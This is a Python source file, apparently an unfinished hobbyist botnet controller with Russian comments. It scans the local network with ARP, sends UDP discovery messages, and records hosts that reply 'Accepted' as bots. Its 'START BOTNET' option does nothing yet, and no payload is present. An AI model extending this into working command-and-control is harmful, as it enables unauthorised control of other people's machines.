import platform
import subprocess
import re
import socket
# import keyboard
import threading


class Network:
    def __init__(self):
        self.host = socket.gethostname()
        self.ip = socket.gethostbyname(self.host)
        self.port = "8080"
        self.OS = platform.system()
        self.addr = []
        self.bots = []
        self.server = ""

    def FindDevices(self):
        if self.OS == "Windows":
            addr = subprocess.check_output("arp -a", shell=True, encoding="cp1251")
            # MyAddr = subprocess.check_output("ipconfig", shell=True, encoding="cp1251")
            ip_regex = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
            addr = re.findall(ip_regex, addr)
            # MyAddr = re.findall(ip_regex, MyAddr)
            # print(MyAddr)
            # addr = [i for i in addr if i not in MyAddr]
            self.addr = addr
            print(self.addr)

    # перед работой сделать udp запросы по адресам, которые есть в self.addr
    def FindBots(self):
        for i in self.addr:
            udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            udp.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            message = self.ip
            dest_address = (i, 8080)
            udp.sendto(message.encode('utf-8'), dest_address)

    def GetAcceptBot(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        server_socket.bind(('0.0.0.0', int(self.port)))
        server_socket.settimeout(10)
        while True:
            try:
                data, addr = server_socket.recvfrom(1024)
                message = data.decode('utf-8')
                if addr[0] not in self.bots and message == "Accepted":
                    self.bots.append(addr[0])
                print("Получено сообщение от {0}: {1}".format(addr, message))
            except socket.timeout:
                print("Таймаут - больше нет сообщений")
                break

    def Info(self):
        return "#########Choice#########\n" \
               "#(1)   CHECK IN LAN (1)#\n" \
               "#(2)Find BOTS IN LAN(2)#\n" \
               "#(3)  START BOTNET  (3)#\n" \
               "#(p)   Print Bots   (p)#\n" \
               "#(e)     EXIT       (e)#\n" \
               "#########Choice#########\n"

    def StartServer(self):
        while True:
            print(self.Info())
            x = str(input())
            match x:
                case "1":
                    self.FindDevices()
                case "2":
                    validate_threading = threading.Thread(target=self.FindBots)
                    accept_threading = threading.Thread(target=self.GetAcceptBot)
                    accept_threading.start()
                    validate_threading.start()
                case "3":
                    print(1)
                case "p":
                    print("Bots in botnet:")
                    print(self.bots)
                case "e":
                    exit(4)
                case _:
                    print("Command not found!")

    def Client(self):
        print(self.ip, self.port)
        # создаем UDP-сокет
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        # разрешаем отправку широковещательных пакетов
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        # устанавливаем адрес и порт широковещательной рассылки
        ip_address = socket.gethostbyname(self.ip)
        # получаем адрес подсети
        subnet_address = '.'.join(ip_address.split('.')[:-1]) + '.0'
        broadcast_address = f"<{subnet_address}>"  # здесь необходимо указать адрес подсети для броадкаста
        # привязываем сокет к адресу и порту
        server_socket.bind(('0.0.0.0', int(self.port)))
        # слушаем порт
        server_socket.settimeout(10)  # установим таймаут для получения сообщений
        # получаем сообщения
        while True:
            try:
                message = "True"
                data, addr = server_socket.recvfrom(1024)  # получаем сообщение и адрес отправителя
                self.server = addr[0]
                print("Получено сообщение от {0}: {1}".format(addr, data.decode('utf-8')))  # выводим данные
                server_socket.sendto("Accepted".encode('utf-8'), (self.server, int(self.port)))
            except socket.timeout:
                print("Таймаут - больше нет сообщений")
                break
        print(2)

# Будущие фиксы
# сервер отправляет сам себе запросы!
